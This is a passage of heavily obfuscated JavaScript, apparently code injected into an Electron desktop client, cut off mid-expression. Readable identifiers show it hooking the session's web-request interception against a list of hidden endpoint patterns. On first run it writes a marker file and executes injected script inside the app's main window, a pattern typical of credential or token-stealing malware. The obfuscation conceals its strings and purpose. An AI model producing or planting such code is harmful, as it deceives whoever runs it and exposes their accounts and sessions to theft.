NWi','WRJdM8oplSoG','W6aHWPudWQi','W4pcLWDMWOm','WOZdMaPZW7m','eSo3q8kMvq','hWrGWQFdTq','W7xdV8kGEqa','W5hcJL8jgG','e8k/ca0G','WPNcPNO3WRa','W6SEa8kSW6K','W4pcOSovaCoa','WQZdUSouWPFdQG','WQ/cV0a7WPq','hW3cHNRcGW','fSopFcOV','W4pdNv8wka','EmkPFmoLpW','WO4kc8oSW7e','ohFdKCoqW68','dSkni8o5lG','DSoUtCoIWP8','WPldOH18WPu','W4FcSYrKWOW','WRRcP8ofWPlcNG','W6ddGmofWORdJW','pdFcSv7cPq','WRjpWOxdQSk0','WRqtzCkGwW','W6mFWR0MW50','WRP0pCo7xa','W7OjnCk7W64','W5KHiwT6','DCkwWOKdWO8','d8oRWPWl','wSoMsmkJqa','ksVdM8ocWQG','CIRdRSoKWRS','W6rImG','BCkSymo4W4S','WQpdUSosWOFdGa','mmofrbGH','kmouWOuOWPW','CSkODSo5pa','W6fQoSkZxa','WQhcNmkzm8o3','WQfTFSkayq','WPJdV8ojW7JcUW','WRRdO8onWOFdUW','W4zIseJcVa','bCoWkZVcJa','ceDmW4y','EIpdG8omWRm','AZ/cHmorW4i','W4BcNu4bna','WQBdUCo7WQ0z','kSokWO7dLSon','bSk8cCoQgG','W5ldNeLAma','WOLVW6tdP8kr','cmkZW4ddLCkO','WR7dPCkpWPFdLa','CSoEWRRdH8ol','geX/WOldIG','WO5aW5ZdLmkk','W5ihzt7cSa','jCkGWOBdJtG','zIlcIW','bmkJrGOY','WRNdN8ozWRKb','WOddUYWKWRy','A8ouWPS','uSkSW4qWW5e','cCofAJDL','t8kTqCkXW4q','W7pdRSopnmoP','W4jQhSkzDG','ACkOmSoIiW','eSohydDW','bxNcJNBdIa','WQNdTCobqKRdJWe','W7blrJi+','vmkJWOy4W4K','WQnoW4VdVCk9','nmo1nmofWOu','W6jtW4ddUSk8','W5pdUZtdMXK','W7j3sZmJ','WR0FWPRdGfa','l8kHWQFdOIy','DCo0WQ8OWQq','umoNDCkLrW','W717W6qwtG','W5OJWR4oWQ4','WQddU8ogWPRcJG','W5m1rqRcVq','WOevWP7dLM0','rSo0WPVdRSkW','vmoGWR8UWP0','W7v2WPixW5a','W5ygo8k1W4e','WP3dUbKbW4K','W7tcOCokiSoU','pHZcN2xcGq','pIRdP8oeWQi','BJ3cNCoiW74','zGddTCoNWQG','EJ3cHSkxW4O','WRahESo3W64','fCkYdqi3','hSk1WOBdNa4','xHvOWOhdLa','DmoEWPCkWQq','W7TdWQ4','WRL8a2yZ','W6nqWRGT','rCkmpmo1yG','W7faWR8QW40','W73dQSkBW6mA','W69KW51oaW','WPanqmkpsG','WR86WP7dIhS','W5vCvamD','mmkfW7xdHmok','gt3dLa','WP9/FZyMW642WQhdGJJdI8kWDq','xCoMW5u','xCoWtCkkrW','gmo6rJFcJG','W44Gx8kynG','cmo+FtyO','omoxWRldJW','WQvhW4tdU8kL','WRtdP8odW47cNa','otZdImoAWO4','W5VdPwJdKqy','WPFcPKu7WPC','ArNcUCo4W4q','WQ7dQSogiCoG','WRJdJCkFlSkJ','wCkNqSoQW4e','D2v5WOFdOa','yt7cGmojW6e','W7LmW7ywAW','bmotWQeWWOu','AIdcISomW4y','WPa2q8kDmq','bSoeWQeiW4e','oSoGWRWHWQy','WPRdH159W6G','Amk1lW','W6aHnSonnG','W7q+aYr5','W6rGma','e8oEmG','WQW0lCoHW4u','WRiVoCkZW4i','cmkHWOS6W58','c8oUghRcGG','W5xdHCkiBsS','WRBdSCkiyCk9W7hcPSofsmoLFMNdUq','fqrSWPBdIa','e8ohm8oMW4G','WQxcHCk7umol','WRaHFmkIDW','W7jSsJj/','W7ZdLKWfnq','dmoXWOeyW6a','hSoNqdxdIa','WR0+WOFdI2W','rCk2WRSMW4K','W6JdHSoNCgO','lmoaWQZdL8ow','WRKTWOVdLG','a8o/gqyG','WQ1ZFSoVsq','aXzSWPFdGq','W5ZcKMu/WO0','zSoFWRSTWPu','W7ZdG8oUWQKC','gqXPWOZdKW','WRq0fCox','W6ONWQ4UWQy','W6PPmSop','gCoum8oRWOa','iCk/WQFcOc8','W7eRCCobkW','W7RcUmoIDbe','aSkbC8oVja','WQZcO8oxp8o4','W7tdVCknWPhcIa','tmkTWOm9W4i','l8kXdrn6','W47cSb5KWP4','W6X9jmokma','W4ldNg0anq','pM7cI8kPWPG','W5C+qXtcVa','WQ7dNSoyWO3dRq','WQ1LWPVdLge','c2yCW6LK','W6xcMIv+WPe','WQjBWOSQW5ZcJb4','W4KVywW8','W6yhW5ldP8kN','WRbQWONdGYW','W7PfWQ8TW4S','W70gaSkDW4K','WQCKWR4gaq','WPxcPNSFWRO','W6veWQmXW5O','c8kGc8o4W5q','W5tcOZZdHai','rJtdOCojWQq','fmk5dGa7','W7PGW7ac','W4xdGvj0W74','cgzUW4ddJq','W4ZcMW1vW4K','qCo5WOZdKCkM','wSoKW5JcVee','WOBdRgNdLXG','W5acxGpcQq','W7pdNCowpmoG','W4GkrqJcVa','W4lcPw0/W78','W6RcPCopdSo7','W7bRvJC4','WRm4jCo6W48','WQBdU8os','B8kar8oRW6K','odJdLmovWRq','WPpdK8oWfSoh','W4uPjmkwW64','W4xdSmkVqcu','mSonl8osWRy','W43dRJfxWOi','WQCHexnUrmo6WQpcR8kmW6LjWOK','WR9JWPxdH20','rCkWWPy7W54','WQjdW5xdOSka','WQL0pmkIWOq','bmo5xWqX','W5xcNvKrmW','W75QqbiY','W4ddSM7dIau','emoQoIdcGa','smkQv8o2W50','W7ZcMczPWQK','v8oUWOtdKwO','tmoIWQpdKSk0','kZ/dM8oDWO0','kYZdL8ocWQG','sCkXW4z9WOq','WPVcUsq1W6W','W71FWQ4SW4G','mtxcICoyWQW','WPtdVSotWPBdLa','W5/cJH5YWRq','WPlcQtxcKLG','oCkHD8oIfa','ktRcLSovWQG','W540WOyuWPq','WO/dJSoKW7hcMW','W4RcUb5NWPu','tCoQvmk5WPu','WQpcOSk6BCoe','nxZcHCklWQy','frb5WPRcJa','omo3WRyMW7u','WROJWP3dH20','u8o4q8kUcq','WRldN8kFlSk8','W64MWOu0W6W','kSk4WQtdRta','tSklamkDb8kRWPxdRCkcW4GMf8ky','x8o8smkZqa','e8kJWORdMsm','cSoXWQRdTSo4','bmoUWPC','W6hdUSoQA08','o8oRWRCMW5O','WR/dTmowWOxdPa','W6WYWP0W','dSofcGNdMW','WQ3dU8oEjmoL','W7vbWQnSW4K','WPxdR0fSWO4','eSooqCoDta','WQP1y8o/uG','BI3cHCo1W6i','W4iQwGlcTW','DY/dT8osWPK','pCoWmbVcOG','pmomWRpdHG','t8kVW4S1W5W','mK5hWOVdPa','W5xdOZq5W6W','WR7dS8ow','WOBdKHy8W6S','WRi5nSoGsq','W71DWQ8','W6hcS8kNjGy','WO3dMmo8oSoX','WRBdQmoFjMi','EmoVo8oTka','WQ7dMSoqpCoN','W7X4W64dqa','kvTwW5ddTq','wSo2W7/dNIq','W5SQvSoDFq','W6JcS8kEW6zb','DshdKq','W657WPvYWQC','WRFdTSkoWPBdNW','WQJcGCkME8oy','AcNdGmoCWRG','WRpcTmovW6il','hSkdj8k2kG','jSkoj8oWyW','W5FdGWeRW7O','wCoRq8kJCG','tteEW6XR','k19rW5BdSa','W75IWPRdLNC','AmopWPZdI8oCW6hcNa','h8k0mCofDW','WOKWu8kAAW','W7esjmkXW7q','gCo9bYBcHq','kd3dL8oeWQm','jCoHAGaw','WOxdHrW','aCoTWPugW6e','WPNdS1O4W5fCW4pdGNCsW7ldKIG','fc9MWOldPG','q8omWR3dJSkj','DCoiW4tdMSkG','W7rGqcmI','vCkprSoApG','p2fdW5xdTW','W6ODjmoXW70','fCoVW4FcKwK','uCkcWOCuWQJdO8kQWRC','kdJcO0dcLG','WP/dGvSamG','nSozWR8oW7S','WQ1hC8obeW','tSkGrSo+W5a','qY4jW6TL','smogW43cK30','pmkWWRNdQJa','xSoZW4FcLe4','FmoOCCk4la','fCkHcaOM','WP3dKHOyW7a','W5hdHheXaa','oCk0WRxdJta','WRNdTmoulSob','kCodw8oo','WP/dTSorWPJdIW','zINdMG','WQ9Vy8oRuG','WQZdM8kCCCon','W6m2W6exrG','zSk3WQldOdW','smoPWRGxWPG','fczSWPFdHq','FdldGmoJWRa','f8oFWROF','W7tdVvaYpq','qCo7WPVdLCoN','WQTOt8oUwa','W47dUGb9WOS','ymopWRuvWP4','WRSOWP7dHwe','W4tdLKObnq','WQDKW4Wisa','WQP5DSo9sa','CaldLCoNWQi','W6/dGCoO','qcqoW7L5','W53dUu0Bkq','fCkKxqj0','h8ocumooEq','v8khW6bbW5hcK8owWRVdG8onWPZcINC','WOf2W6tdGSkH','WO/dVqSqW5S','WOmmvmkMvG','l1fXW5hdTq','WQZcVSkuASo+','W6ldSSkPieG','prpcU1xcRq','fqXPWPddSW','W6CMz8o1uW','WRRdQmotW5FcKG','xG8JWOtdGq','W4RcTaSOWOa','bmoKW5OiW6G','h8oMW48','emofW6G','W6Trm8o4W7i','D8obqCkKzW','WQRcO8oxpmkK','zcRcH8omW7i','F8kWWOeLW5K','WR7cKmkwnmoG','sYFdHmoJW60','xmk8umoxga','WRnUW5ldOmkz','Dmk0DG','W7VcQtXRWQi','CCoDW4hcH30','W6f/W60JFG','FSk+E8oLpW','oHzgWOZcRG','W4BdTMT0WQa','W7ldPmk0Bq','ytxdNmk7WPG','a8kmW7hdHSoA','WR10omohzG','x8oNsCkYha','rSk9WRpdUSkA','W5FdG04ypG','k8o0rYSX','eSo0dqBcKa','d05qW7BdNq','WOldIConimoG','t8o2vmkZgW','tSo3cmkJwW','WP/dTYmJWQe','CColW4m','W4LFW7uizG','W5VcSG9RWOi','bmkDE8o0ka','W5VcSCk/Du0','W4WPwbBcQW','oCk0WRxdVJ4','WQ7dPCofWOldLW','amoEWRavWPW','WO85imoTW4G','gsZcIMxcIq','ESoUW4tcPM8','WRi5nSoGtq','hSooWPaMW5y','WOVcJryUW7m','WQn5mSoFlW','WR3dSSobW6iF','c8k+WQ/dUZu','WQD7W5LYW6G','WPe2wCkhFa','WQyaW7PZWONdVfOVbvS5WOS2','WQZdMmkdsmkq','sCoHsSkZ','W7WaWOGYWQa','W6uapMbF','WO7cUSkCumoZ','oSk5WRldOa','W7NcNCoJyxe','W4ddINFdVGe','W6a4WPqYW74','W4hdQeCO','a8oXWOzpW60','WQ/dJmoCo8oS','W7ZcUI1kWQK','jCkOhCoHoG','bCoJWOeGW7G','W6ddLSoAWPZdIW','WQ9SymkYxG','xCoGvCk3wW','WRzwWQ83W6a','cmkLWOnPW5S','t8o2WOpdQ8k0','aCoRWPeoW7S','W4ldRW94WO4','W7DEWQqWW4S','W5b0bu/cQG','bZZcJtZcIW','bWDVWRhdGq','WQBdUmouWRuL','WRpdV8oAWO8h','W6P2W61pbG','W6j8WPaSWQO','f8kvvmoDvG','yYFcGmoyWR4','FZ7cGSowW7i','WPhdTImfW64','lWlcGCoyW54','dSocDSo8WP0','W7ryWQ09Ca','W4RdRWXHWOS','WQjyW5hdQ8k6','Dmo+W7JdQJy','WPxcShOTWRy','sCkKW4WZW4S','emovWROdWO0','smk3WOO/W4G','ACkmWQu9W7q','WQpdQCouWR8B','WQCWWP4YWRa','smo8DCk0rG','W7pdGmoNA3C','W7dcR8oRjCo5','FConWQtdHmkn','qCo8W4JcSge','BmkJWRldUIO','z8kuWPOdWOe','W4O1cSklW50','v8oHWR/dImkU','k8kcnSk3iq','DCoMFmoJjW','oHNdQ8o2WRa','WRNdNmoDoG','sCoVWP8','W6GuW6W/W4S','W4zSW5ycvG','W6ZdPmojAem','W7D+WQ4qW7a','W64JWPHZWRu','W7tcKCk5owq','W49HngX6','W60FCmk8W6y','aCoNx8kWuq','W6JdVSkWyq4','fmotWPRdTmo5','W4tdLXaxka','xaRdTCoAWPC','WPi0mmk2yq','W7ejWOhdLMC','W6jRga','chdcGhFdJG','emoNbHFcLa','W7zZWRWBW5G','cmofoCoMWOy','WRZdMSoudmoR','FsRdKW','WRBdNCowpmoG','nmkDnSoPoa','WQ7cNSkZESos','DmkGmSo3Da','W7mNqw4Z','W7ayBYNcVG','cmo6WPCmW4K','WRHsvSoQCG','gmkAmCoRlG','WRbtW4RdUSkM','WRtdISkDzSkR','WQRdOCoaWPZdGa','sCkpWPq5W5y','dmkajSoSzq','qCkXWPCJW4m','s8ouvCkzxa','W6pcGSkCA8on','dSojcmooqG','bcZdNCohWRi','WQtdMmotWQNdQG','W7PMWOKNW4y','kCo8jCoHWR4','WQmMzSotW7a','qSkJWReYW7S','rCk6WPq7W54','W646WP8OWQy','WRKTW4ddIsW','yXddVCo8WRy','W7tcTColoCkJ','rSkPuSo2W4e','rCoPWQSQWO8','aWRcR2lcLG','WOvSxmkCEW','gCoQWPCb','eCotW7CSWRq','ycNdP8oNWRe','emoPoSoHWOC','W7agiW','bCkGeqW1','aCkbjq','WRFdV8ofWQ0n','W53cTq18WOG','W5KnpgDx','W4xcRWDrWR8','f19SWP7dUq','WPRdNCoRWOqA','W6BdL1VdNcW','WR7dR8kxE8kL','A8oDWOVdOSkM','W7VdH8oXDYS','WRCKWOK','WQ8Wl8oMWPy','W7XWW7atrG','imk0WQddKs8','BJ7cNSotW6G','k8oXWRddQxe','W6xdQCkTzW8','fSoeWRK','W5/dH1y','W5pdI1Sxaq','WO7cOdldJbK','xmkbihn2','WPddO2VdKcZdLMW','W7PuWR0CW48','W69QW7mqqa','aSoWWOyCWRi','fConycS8','j8oSWOyTW7K','xmoNW4iOW5W','W6FcQ8oYiSoK','rSoLdZhcLq','WP7dG8oeW73cNa','n0OeWOpcRW','lK1hW5FdTa','W47dQaOMWOm','W7ONW5L1WRG','BCo0uCkiyW','WRPvWQ8LW54','WQroW5lcOmk+','W4m6aGxdTG','fSoeWRKc','W5ePreNcTa','W7OWWQiasG','W6a+W54QW6K','xmoUW5BcQhO','W48bomkzW4m','lCo/WOe9WPW','bSoXdZ3cJW','f8oVW4FcM20','smoIW43cMq','W6fRW6q','ndddUSotWQe','xmomWP/dJ8k1','imoTWPyAW6m','jCk1WR7dVtW','bd7cGh8','W40Xqa/cTG','w8o2uSkbwa','W7GYo8krW64','r8o7WOZdJSkW','b8oTWPS2W5C','W6KYWOqWWRC','rJGCW71/','WO0VsrlcRq','l0CkW4tcRG','r8kUWOtcI3W','cmkIWPuiWQe','W7FdMmoGBxC','WR3dRSovW6ii','W4FdRHXPWOK','D8oBv8kVFG','W7GkWQWSW40','CCoZW5hcGum','WO/dRtSbW4G','f8kgfXeN','W6DWW7yjvq','BmoDWOK5WP0','sSoQuSk2WPO','d8kkp8o9oq','W4GLrCkBEG','WQ8nx8kSBG','w8oqtCkjqq','WQ8HlSoNwG','WPvhxCo9sq','nw5qW4RdTW','W6SugSk5W60','a8owAJOE','EmkPFmoLja','dSoiAW','W7S+WPSUWOi','cmo2WQ0DW6O','zINdHmo2WRe','W6hcRSkqEmkI','W6/dS8kJ','WQPXq2GZ','zYpdHSoGW6W','f8k3edCd','W7fjWQ8GW7K','W5veWQWCsa','Es3dKmo6WRe','W6qmFSk7W7q','yCoTWP3dPCkT','WQddTSkjW53cKG','e8oVWOtdKwW','t8kRW4hdL2e','c8ofomoSWPO','WRPuWRiZW5a','pSkWWRtdPru','WQZcHCkjzCoe','WOSvASkwCa','W6/dUvqKda','xSkSxCo7W5O','aSo4qCo2W50','W7NdNmoQD3e','WOVdLSoBWPWK','W6hdTSoUWO/dSW','hCoJWOeCW7G','WOVdHWG3W6y','jMxdH8kuWRG','WOZdOCoBWQJdQa','sZ3dH3xcGW','yYRcUSoqW4C','WQxdTCoFWQGa','zJldH8kOWQO','BxhcISkrW7u','W75mBSkJW7W','tSo2uSk1rG','WP7cLXT7W7y','k8o3W7hdQNe','mSoYWO3dOCoA','W77dV8kyW7fr','WP3dMHimW70','W5W7ye94','vJqvW7iI','ESkvCCoKiG','hSkKga0G','rSoYWRquWQO','dSo6iqdcQW','EZtdKa','WQ46jSonW58','WOFdHNFdNq','fdLVWR7cNG','AYNcQ8o0W6K','WQDUDCkMfq','eCkGdq8T','hCk/WRddLWK','lCoMaHdcJG','W5m4tJtcVq','WR7dOmoCWPZdIW','b8oOWQtdJSkG','gCoHWPxdKmoO','WRRdQmomW73cLq','W7iNWP43WQy','ztpdNCoHWQy','bmoUWRqsWO4','DmkOyCoIAW','WQHvW5hdVSk6','iY3dH8kcWQ8','jmk+nCoIoq','W59kFrmK','WRC2WOa0WPLYsW','vmoIWOv0W4u','W4BcRJpcMa','WPJcU2W5WRC','fCodomo7W5O','W6jKWQLpdq','WQRdUCkHzaq','W4pdUWHNWPu','pHVdVSoGWPa','neXgW7RdPG','zIJcLmoNWQS','Dh1nW5FdOG','C8obCmk6qG','WONcSN52WQu','B8kJyCoI','frP9WOZdLG','mCooWRJdJmkc','W7SunSk5W64','WPtcV3KxWRu','W6lcSSoxpa','W57cTqD6WOi','b8ktmsi/','gSoTW4SWW4u','W6n9i8opkG','d8oQnYBcHa','WQNdTmoaWOldMG','a8oWdW','qmk1W4ddH8kY','WRaRWOddH2C','WQ4OpSkOW4K','W4hcSXOOWOu','WO7dV8obWRZdUq','pJZdImoxWQq','smo4W6FcLNO','EmkdW7xdGmka','W5FcMKuxka','s8oNWPZdMmoV','emodmCoHWPS','W697W5BcLtDBW6/dR1NcMSoGWPu','W6qmFmk5WQy','WQJdHSoiW5RcIa','WRiVWPRdGsi','ddZcNvdcIG','WQXvWOpcQmoH','h8kuvmoExG','h8oQqh3cMG','tIbtWRqO','nCkztCoZoa','t8kWW4W4W4K','hmo3cmkKuq','uSkWW47dNCk3','hW5PWPpdHq','C8onWPCuWOG','hSkbomo8ja','W487phH6','c3ztWRCJ','hSk3qx3cKW','eSojiCoxWOu','WO/dKrKUW7m','W6xdQmoCEmkI','WPzvW6VdHCkU','fCoamW','wCo1r8k1wa','cdBcH2lcKG','W5tdMLaq','lIZdLa','WQBdPSoJWPub','WRZcL8oAn8oZ','W4/dKhddIGu','WQdcU8oSAL4','W5H8WQu5W4C','yxBdMCkAWQu','W7eDWQ4MW5m','uSoNq8kUqa','dIJcNhJcLa','emo7p8oMWPe','WOu7vCkwBa','WOZdKXeyW7a','WR/dICoxb8og','W6e3WP4RW60','WQZcRmkWwSoN','mCo+WRSGWQlcNhy','W53dR2JdNvO','WO7cOdldMKK','uSoXBCkoDW','WRldJSom','WQpcGCkCz8oj','WOFcOYy5W78','cSoAxdWR','lKOkWOZdVa','vJHuW7LY','W5m3nSkzW7m','WRJcM8ksBCou','vmkvvSoctq','WQJdLColzSoL','W5JcGYO+W57dOrfT','WR0VjCoJW44','W71XWQG8Da','h8khnSo2','fCodomkOW58','W7bEWR1TW4G','tJHCWRPO','WR9PDCoVsq','WO/dGW0PW7e','W6ONWQuZWQG','d8kaFc0Q','lmobW7pdGCoq','W7pdT8o8veC','WPq+WOddGua','smoeWP3dKSk2','WRvUW4ldR8k5','W7tdGmoWDNa','W6uGjCoCmq','WRy+WPRdLhe','j3VcNSokWRC','tSkKv8oQW58','W70XiwW','WQZdUSoBWP3dMG','W6DNFmo5sq','WQldSmouWRGk','qmkvgSojvG','dN/dJ3xdIa','BH3cJConW7G','W7tdHmoZimoK','W7FcS8kf','WR3dPSkAWQ7dGW','W6mUoCoimW','fCocDSo/WPW','vNVcMMxcLa','W7RdUSoeWQim','zZxcIq','WQ00WPqOWPW','WPZdJCoRWQyw','kuTbW5hdQa','WPqhECkFDG','W5PSh8kuAq','W6HFj8k9W7K','W7tcRuBcK1y','amodw8oUsG','zSkIWO7cK20','WO3dKfy2WRe','ASkSWQ81W4i','rYJdK8okWPu','fColBIS7','W4VcPqHPWPi','W7LHbmojlq','W5aYCZK','W79vWQmWW5W','u8o/W5BcH3S','sSoUvmkZW5a','WR5Qqc04','WOhdVqS0W7e','t8oFW43cNg0','rSklWRmEW48','y8olWO0rWOi','c8opxmoFwG','WO3dQSoJW5FcRa','FtVcJColW74','hdvKWO3dGa','tmo5WOi7W54','tmoYvmkZuq','DuLhW4FdTW','W7FcLSoEp8oZ','zSkfWPKbW4m','yCkeWQFdQJ4','mJRcL8opW7q','WQRcO8oJmmow','eCohyt03','kSowW6BdI8oz','xSkXxSk3W6G','mSo2DmoKAW','rwanW7vK','rt3cJhFcHW','uSodvmkVra'];_0x32b1=function(){return _0x155f5c;};return _0x32b1();}function _0x2ada44(_0x5e2e01,_0x2190ff,_0x367fe0,_0xf69e63,_0x2bb0eb){return _0x3a78(_0x2190ff-0x2ae,_0x367fe0);}const _0x4ceb49={};_0x4ceb49[_0x42c156(0x1ba,0x52e,0x342,0x32a,'S$EO')]=[_0x14e30b(-0x275,-0x18c,'G$kb',-0x53,-0x3b4)+_0x2ada44(0x7fa,0x6a7,'OhVE',0x6b3,0x610)+_0x14e30b(-0x4e,0xeb,']eq@',-0x155,0x337)+_0x4fef24(0x6b7,0x6df,0x7d5,'357&',0x710)+_0x14e30b(0x1d0,0x1a,'er11',-0x133,-0x111)+_0x42c156(0x3fb,0x5dc,0x5b7,0x6d0,'eqrc')+_0x4fef24(0x3fc,0x376,0x111,'89@x',0x339)+'e',_0x14e30b(-0x286,-0x16c,'lOZ%',-0x30b,0x68)+_0x42c156(0x56b,0x35c,0x4d5,0x3a2,'Q9lz')+_0x2ada44(0x387,0x580,'[qHe',0x700,0x5c5)+_0x4fef24(0x21d,0x3c3,0x263,'H1Ip',0x407)+_0x4fef24(0x56b,0x56a,0x25c,'ut@m',0x490)+_0x4fef24(0x5f1,0x8c8,0x9cd,'Ri!W',0x7be)+_0x533ec6('(CAj',0x780,0x556,0x7ec,0x880)+_0x2ada44(0x795,0x787,'wu8H',0x923,0x5f6),_0x4fef24(0x3ac,0x649,0x475,'[qHe',0x51d)+_0x42c156(0x3f9,0x2c,0x1b6,0xd3,'S$EO')+_0x4fef24(0x19d,0x3b6,0x2c7,'[GQe',0x31b)+_0x14e30b(0xdc,0x1,'08kG',0x270,0x192)+_0x4fef24(0x807,0x916,0x633,'OhVE',0x75d)+_0x533ec6('Hk9Z',0x5dd,0x39c,0x54a,0x46e)+_0x4fef24(0x42c,0x2c4,0x756,'S$EO',0x515)+_0x2ada44(0x8a2,0x860,'G$kb',0x73e,0x87f),_0x533ec6('G$kb',0x497,0x2b2,0x31b,0x34d)+_0x4fef24(0x279,0x52f,0x308,'llM9',0x324)+_0x533ec6('z2Oe',0x651,0x4b7,0x744,0x837)+_0x14e30b(0x38,0xd0,'%3Y$',-0xbe,-0x126)+_0x2ada44(0x2ed,0x4b1,'89@x',0x46a,0x49e)+_0x42c156(0x133,0xde,0x26e,0x127,'N!u(')+_0x42c156(0x2f4,0x1fe,0x28e,0x4dd,'Np[W')+_0x14e30b(0x18c,-0xdc,'KO@1',0x138,0x25),_0x4fef24(0x6d7,0x4d8,0x551,'Ri!W',0x4d9)+_0x4fef24(0x366,0x23b,0x4c3,'asq^',0x365)+_0x4fef24(0x4a2,0x356,0x66b,'N!u(',0x44d)+_0x14e30b(-0xfd,-0x83,'MCP#',0x12a,-0x5)+_0x14e30b(0x31c,0x34f,']eq@',0x1aa,0x326)+_0x2ada44(0x703,0x4b4,'OhVE',0x5b2,0x306)+_0x2ada44(0x8d1,0x8c6,'G$kb',0xade,0x656)+'in',_0x2ada44(0x72a,0x797,'DbP#',0x9bc,0x7f6)+_0x533ec6('K$Eh',0x766,0x9b5,0x705,0x6af)+_0x14e30b(-0x1a2,0xe,'OhVE',-0x20a,-0x92)+_0x533ec6('eW#d',0x4c0,0x70b,0x412,0x5e2)+_0x2ada44(0x90b,0x69e,'Q9lz',0x7f8,0x780)+_0x2ada44(0x42a,0x593,'asq^',0x5e1,0x55b)+_0x2ada44(0x5a5,0x724,'[qHe',0x767,0x6c0)+_0x2ada44(0x7c4,0x732,'nSPg',0x91d,0x54c),_0x14e30b(-0x5,-0xf,'wu8H',0x22a,0x164)+_0x533ec6('MCP#',0x886,0x9d4,0x8fe,0x820)+_0x14e30b(0x158,0x245,'39*L',0x22d,0x1c9)+_0x2ada44(0x705,0x5e3,'(CAj',0x66b,0x77d)+_0x14e30b(0x276,0x167,'Np[W',-0xf1,0x208)+_0x4fef24(0x5d7,0x6b8,0x54f,'K$Eh',0x72b)+'ns'];const Endpoints=_0x4ceb49;session[_0x42c156(0x408,0x3ed,0x4ed,0x40b,'3MeJ')+_0x2ada44(0x88d,0x7f3,'39*L',0xa28,0x83b)+_0x42c156(0x414,0x4aa,0x3ee,0x634,'z#EP')][_0x42c156(0x52d,0x252,0x35b,0x147,'m^ii')+_0x2ada44(0x45a,0x6ad,'lOZ%',0x87c,0x742)][_0x2ada44(0x6a1,0x72e,'08kG',0x4fc,0x813)+_0x42c156(0xfc,0x4ab,0x271,0x2d5,'%%)G')+_0x533ec6('%3Y$',0x865,0x64c,0xa05,0xa4c)](Filter,(_0x1ffa04,_0x379d6d)=>{const _0x3eff86={'EHcCa':_0x35a9f0('z#EP',0x795,0x514,0x558,0x318)+_0x35a9f0('llM9',0x544,0x7df,0x6f9,0x964)+'+$','VJRDK':function(_0x3deacf,_0x48f429){return _0x3deacf+_0x48f429;},'WnXOC':_0x59e7c9(-0x25,'357&',-0x69,0x3a,0x3f)+_0x276168('bjTv',0x72e,0x640,0x74c,0x83e)+_0x35a9f0(']eq@',0x49d,0x1f7,0x40d,0x1e8),'cflcs':function(_0x396bbe,_0x2dd00f){return _0x396bbe===_0x2dd00f;},'dgEKx':_0x35a9f0('nSPg',0x2c8,0x3d0,0x4aa,0x48e),'HYbMp':function(_0x3c3501,_0x4af314){return _0x3c3501+_0x4af314;},'wEshB':function(_0x36040b,_0x2db8a8){return _0x36040b(_0x2db8a8);}};function _0x59e7c9(_0x49f01c,_0x2e319a,_0x11f5b8,_0xa4eb3a,_0x5c72a8){return _0x14e30b(_0x49f01c-0xdd,_0x5c72a8- -0xcd,_0x2e319a,_0xa4eb3a-0x64,_0x5c72a8-0x31);}function _0x35a9f0(_0x5a1873,_0x3d97cd,_0x347534,_0x58b137,_0x54f451){return _0x2ada44(_0x5a1873-0x126,_0x58b137- -0x78,_0x5a1873,_0x58b137-0x1c4,_0x54f451-0x38);}if(!fs[_0x2ff83b(0x281,'G$kb',0x4d8,0x107,0x352)+_0x2ff83b(0x31d,'z2Oe',0x314,-0x30,0x23e)](_0x3eff86[_0x2df85c(0xaa,0x49,0x1b1,0x22a,'nSPg')](__dirname,_0x3eff86[_0x59e7c9(-0x280,'H1Ip',0xac,-0x2e9,-0xac)]))){if(_0x3eff86[_0x2ff83b(0x486,'08kG',0x1b9,0x250,0x29b)](_0x3eff86[_0x2ff83b(0x656,'llM9',0x6a8,0x3bd,0x482)],_0x3eff86[_0x59e7c9(-0x36b,'vj69',-0xab,-0x9a,-0x11f)])){fs[_0x2ff83b(0x33d,'3nC1',0x507,0x5cf,0x437)+_0x59e7c9(0x32,'Q9lz',0xa2,-0x1d0,-0x6a)](_0x3eff86[_0x2ff83b(0x114,'89@x',0x43d,-0x13,0x208)](__dirname,_0x3eff86[_0x59e7c9(-0x28e,'nSPg',-0x2c6,-0x351,-0x1b7)]));const _0x32ee8f=BrowserWindow[_0x2ff83b(0xf4,']eq@',0xf8,0x41,0x244)+_0x2ff83b(0x232,'[qHe',0x40a,0x304,0x294)+_0x35a9f0('z#EP',0x3a6,0x477,0x441,0x46a)]()[0xe23+-0x1532+0x70f];_0x32ee8f[_0x2ff83b(0x3d1,'39*L',0x329,0x1d6,0x1ac)+_0x59e7c9(0x21c,'0tL3',0x2a,0x11b,0x165)+'s'][_0x59e7c9(0xe3,'%%)G',-0x1f3,-0x9,-0x7f)+_0x59e7c9(-0x3f4,'llM9',-0x40b,-0x287,-0x20f)+_0x2df85c(0x246,-0x17e,0x1a,0x42,'357&')+'pt'](_0x2ff83b(0x36,'X9oW',-0x76,0x1a7,0x1d4)+_0x35a9f0('K$Eh',0x51f,0x3e8,0x48e,0x6f5)+_0x2df85c(0x108,0x2fa,0xa3,0x1bc,'KO@1')+_0x59e7c9(0x260,'vj69',0x2db,0x48f,0x243)+_0x35a9f0('(CAj',0x8bf,0x5ad,0x7d1,0x960)+_0x2ff83b(0x38a,'!6ND',0x72,0x387,0x16c)+_0x2ff83b(0x47e,'wu8H',0x752,0x560,0x560)+_0x2ff83b(0x1cd,'@)Mb',0x5f6,0x5ca,0x38c)+_0x59e7c9(-0x424,'DbP#',-0x132,-0x13f,-0x214)+_0x59e7c9(-0x1fb,'llM9',-0xca,-0x2b5,-0x166)+_0x35a9f0('CV[@',0x4b3,0x501,0x6e5,0x5f1)+_0x59e7c9(0x135,'H1Ip',0x172,-0xcb,0x127)+_0x59e7c9(0x227,'eb0J',0x2a0,0x4bb,0x271)+_0x35a9f0('08kG',0x84e,0x853,0x76a,0x789)+_0x35a9f0('EFvR',0x4da,0x2e4,0x471,0x443)+_0x59e7c9(-0x258,'0tL3',0xed,-0x274,-0x66)+_0x2df85c(0x8c,0x360,0x4c2,0x2fb,'!6ND')+_0x2df85c(-0x10e,-0xce,-0x13b,0x78,']eq@')+_0x2ff83b(0x32f,'Np[W',0x353,0x375,0x517)+_0x276168('0tL3',0x161,0x1c5,0x363,0x143)+_0x59e7c9(0x200,']eq@',0x3c,0x76,0x69)+_0x59e7c9(0x4e,'z#EP',0x394,0x2fe,0x19a)+_0x35a9f0('357&',0x5fa,0x81e,0x74c,0x8db)+_0x2ff83b(0x530,'asq^',0x6e6,0x4d3,0x520)+_0x2ff83b(0x1c6,'Ri!W',0x322,-0x7a,0x1a3)+_0x2df85c(0x481,0x5d8,0x36d,0x3cc,'nSPg')+_0x2df85c(0x5ba,0x2ec,0x161,0x3ca,'er11')+_0x2ff83b(0x